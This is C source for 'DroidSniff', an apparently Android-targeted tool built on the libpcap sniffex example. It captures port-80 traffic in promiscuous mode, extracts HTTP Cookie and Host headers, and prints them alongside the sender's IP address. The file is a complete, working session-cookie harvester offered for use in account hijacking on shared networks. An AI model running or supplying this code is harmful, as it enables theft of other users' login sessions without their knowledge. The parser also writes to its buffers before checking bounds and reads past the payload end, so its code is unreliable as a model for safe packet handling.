/*
 * This software is a modification of "sniffex.c"
 * sniffex.c
 *
 * Sniffer example of TCP/IP packet capture using libpcap.
 *
 * Version 0.1.1 (2005-07-05)
 * Copyright (c) 2005 The Tcpdump Group
 *
 * This software is intended to be used as a practical example and
 * demonstration of the libpcap library; available at:
 * http://www.tcpdump.org/
 *
 ****************************************************************************
 *
 * This software is a modification of Tim Carstens' "sniffer.c"
 * demonstration source code, released as follows:
 *
 * sniffer.c
 * Copyright (c) 2002 Tim Carstens
 * 2002-01-07
 * Demonstration of using libpcap
 * timcarst -at- yahoo -dot- com
 *
 * "sniffer.c" is distributed under these terms:
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 4. The name "Tim Carstens" may not be used to endorse or promote
 *    products derived from this software without prior written permission
 *
 * THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 * <end of "sniffer.c" terms>
 *
 * This software, "sniffex.c", is a derivative work of "sniffer.c" and is
 * covered by the following terms:
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Because this is a derivative work, you must comply with the "sniffer.c"
 *    terms reproduced above.
 * 2. Redistributions of source code must retain the Tcpdump Group copyright
 *    notice at the top of this source file, this list of conditions and the
 *    following disclaimer.
 * 3. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 4. The names "tcpdump" or "libpcap" may not be used to endorse or promote
 *    products derived from this software without prior written permission.
 *
 * THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM.
 * BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
 * FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN
 * OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
 * PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED
 * OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
 * TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
 * PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,
 * REPAIR OR CORRECTION.
 *
 * IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
 * WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
 * REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,
 * INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING
 * OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
 * TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
 * YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
 * PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGES.
 * <end of "sniffex.c" terms>
 *
 ****************************************************************************/

#define APP_NAME		"DroidSniff"
#define APP_DESC		"DroidSniff for Android -- Cookie-Helper"
#define APP_COPYRIGHT	"This is free software!"
#define APP_DISCLAIMER	"THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM."

#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 100000
/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14
/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
	u_char ether_dhost[ETHER_ADDR_LEN]; /* destination host address */
	u_char ether_shost[ETHER_ADDR_LEN]; /* source host address */
	u_short ether_type; /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
	u_char ip_vhl; /* version << 4 | header length >> 2 */
	u_char ip_tos; /* type of service */
	u_short ip_len; /* total length */
	u_short ip_id; /* identification */
	u_short ip_off; /* fragment offset field */
#define IP_RF 0x8000            /* reserved fragment flag */
#define IP_DF 0x4000            /* dont fragment flag */
#define IP_MF 0x2000            /* more fragments flag */
#define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
	u_char ip_ttl; /* time to live */
	u_char ip_p; /* protocol */
	u_short ip_sum; /* checksum */
	struct in_addr ip_src, ip_dst; /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
	u_short th_sport; /* source port */
	u_short th_dport; /* destination port */
	tcp_seq th_seq; /* sequence number */
	tcp_seq th_ack; /* acknowledgement number */
	u_char th_offx2; /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
	u_char th_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
	u_short th_win; /* window */
	u_short th_sum; /* checksum */
	u_short th_urp; /* urgent pointer */
};

void got_packet(u_char *args, const struct pcap_pkthdr *header,
		const u_char *packet);
void print_payload(const u_char *payload, int len);
void print_hex_ascii_line(const u_char *payload, int len, int offset);
void print_app_banner(void);
void print_app_usage(void);

/*
 * app name/banner
 */
void print_app_banner(void) {

	printf("%s - %s\n", APP_NAME, APP_DESC);
	printf("%s\n", APP_COPYRIGHT);
	printf("%s\n", APP_DISCLAIMER);
	printf("\n");

	return;
}

/*
 * print help text
 */
void print_app_usage(void) {
	printf("Usage: %s [interface]\n", APP_NAME);
	printf("\n");
	printf("Options:\n");
	printf("    interface    Listen on <interface> for packets.\n");
	printf("\n");

	return;
}

const struct sniff_ip *ip; /* The IP header */
char host[256];
char cookie[50000];
int host_idx = 0;
int cookie_idx = 0;
int truncated = 0;

void print_cookies(const u_char *payload, int len) {
	const u_char *ch = payload;
	int i;

	if (len <= 0)
		return;

	int mode = 0;

	char tmp[5];
	tmp[0] = *ch;
	tmp[1] = *(ch + 1);
	tmp[2] = *(ch + 2);
	tmp[3] = *(ch + 3);
	tmp[4] = '\0';

	if (truncated > 0
			&& !(tmp[0] == 'H' && tmp[1] == 'T' && tmp[2] == 'T' && tmp[3] == 'P')
			&& !(tmp[0] == 'G' && tmp[1] == 'E' && tmp[2] == 'T')) {
		mode = 7;
	} else {
		if (!(tmp[0] == 'G' && tmp[1] == 'E' && tmp[2] == 'T')) {
			return;
		}
		host_idx = 0;
		cookie_idx = 0;
		host[host_idx] = '\0';
		cookie[cookie_idx] = '\0';
		truncated = 0;
	}

	for (i = 0; i <= len; i++) {
		char c = *ch;

		if (mode == 0 && (c == 'C' || c == 'c')) {
			mode = 1;
			truncated = 0;
		} else if (mode == 1 && (c == 'o')) {
			mode = 2;
			truncated = 0;
		} else if (mode == 2 && (c == 'o')) {
			mode = 3;
			truncated = 0;
		} else if (mode == 3 && (c == 'k')) {
			mode = 4;
			truncated = 0;
		} else if (mode == 4 && (c == 'i')) {
			mode = 5;
			truncated = 0;
		} else if (mode == 5 && (c == 'e')) {
			mode = 6;
			truncated = 0;
		} else if (mode == 6 && (c == ':')) {
			mode = 7;
		} else if (mode == 7 && c == '\n') {
			cookie[cookie_idx] = '\0';
			host[host_idx] = '\0';
			printf("Cookie:%s|||Host=%s|||IP=%s\n", cookie, host, inet_ntoa(ip->ip_src));
			fflush(stdout);
			truncated = 0;
			mode = 0;
		} else if (mode == 15 && c == '\n') {
			mode = 0;
		} else if (mode == 0 && (c == 'H' || c == 'h')) {
			mode = 11;
		} else if (mode == 11 && (c == 'o')) {
			mode = 12;
		} else if (mode == 12 && (c == 's')) {
			mode = 13;
		} else if (mode == 13 && (c == 't')) {
			mode = 14;
		} else if (mode == 14 && (c == ':')) {
			mode = 15;
			i++; // remove space
		} else if (mode == 7) {
			if (isprint(c)) {
				cookie[cookie_idx] = c;
				if (cookie_idx < sizeof(cookie)) {
					cookie_idx++;
				} else {
					printf("!!!OVERFLOW!!!");
					fflush(stdout);
				}
			}
		} else if (mode == 15) {
			if (isprint(c)) {
				host[host_idx] = c;
				if (host_idx < sizeof(host)) {
					host_idx++;
				} else {
					printf("!!!OVERFLOW!!!");
					fflush(stdout);
				}
			}
		} else {
			mode = 0;
		}
		ch++;
	}
	if (mode == 7) {
		truncated = 1;
	}
	return;
}



void got_packet(u_char *args, const struct pcap_pkthdr *header,
		const u_char *packet) {

	static int count = 1; /* packet counter */

	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet; /* The ethernet header [1] */
	const struct sniff_tcp *tcp; /* The TCP header */
	const char *payload; /* Packet payload */

	int size_ip;
	int size_tcp;
	int size_payload;

	count++;

	/* define ethernet header */
	ethernet = (struct sniff_ethernet*) (packet);

	/* define/compute ip header offset */
	ip = (struct sniff_ip*) (packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip) * 4;
	if (size_ip < 20) {
		return;
	}

	/* determine protocol */
	if (ip->ip_p != IPPROTO_TCP)
		return;

	/*
	 *  OK, this packet is TCP.
	 */

	/* define/compute tcp header offset */
	tcp = (struct sniff_tcp*) (packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp) * 4;
	if (size_tcp < 20) {
		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}

	/* define/compute tcp payload (segment) offset */
	payload = (u_char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);

	/* compute tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

	/*
	 * Check payload for "Cookie" and print it
	 */
	if (size_payload > 0) {
		print_cookies(payload, size_payload);
	}

	return;
}

int main(int argc, char **argv) {

	char *dev = NULL; /* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE]; /* error buffer */
	pcap_t *handle; /* packet capture handle */

	char filter_exp[] = "port 80"; /* filter expression [3] */
	struct bpf_program fp; /* compiled filter program (expression) */
	bpf_u_int32 mask; /* subnet mask */
	bpf_u_int32 net; /* ip */
	print_app_banner();

	/* check for capture device name on command-line */
	if (argc == 2) {
		dev = argv[1];
	} else if (argc > 2) {
		printf("error: unrecognized command-line options\n\n");
		print_app_usage();
		exit(EXIT_FAILURE);
	} else {
		/* find a capture device if not specified on command-line */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			printf("Couldn't find default device: %s\n", errbuf);
			exit(EXIT_FAILURE);
		}
	}

	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		printf("Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}

	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Filter expression: %s\n", filter_exp);

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		printf("Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		printf("Couldn't parse filter %s: %s\n", filter_exp,
				pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		printf("Couldn't install filter %s: %s\n", filter_exp,
				pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	pcap_setdirection(handle, PCAP_D_IN);

	/* now we can set our callback function */
	pcap_loop(handle, 0, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nCapture complete.\n");

	return 0;
}
